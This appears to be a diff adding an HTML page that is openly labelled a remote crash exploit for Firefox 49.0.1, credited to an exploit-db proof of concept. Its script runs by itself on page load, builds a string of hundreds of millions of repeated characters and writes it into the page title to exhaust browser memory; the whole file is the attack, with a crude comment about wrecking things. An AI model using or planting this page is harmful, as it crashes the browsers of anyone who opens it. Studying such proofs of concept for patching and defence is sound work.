@@ -1,0 +1,27 @@
+<html><head>
+<title>Firefox 49.0.1 - Browser Remote Crash Exploit (Heap-Spray)</title>
+
+<!-- 
+Firefox 49.0.1 - Browser Remote Crash Exploit
+Credits  : sultan albalawi
+POC      : https://www.exploit-db.com/exploits/40536/
+HeapSpray: Taken from Empire stager by: Chaitanya Haritash
+For javascript auto-execution, we need to place it inside <head> </head> tags 
+-->
+
+<script type="text/javascript">
+var ref = (function ex() {
+      var buffer = "";
+      for (var i = 0; i < 50000; i++) {
+          buffer += "\x41";
+      }
+      var buffer2 = buffer;
+      for (i = 0; i < 5000; i++) {
+          buffer2 += buffer;
+      }
+document.title = buffer2;
+}());   // this ()); will auto-execute the funtion 
+ref(); // call funtion again :D just to be sure that it fuck things up.
+
+</script></head><body></body>
+</html>
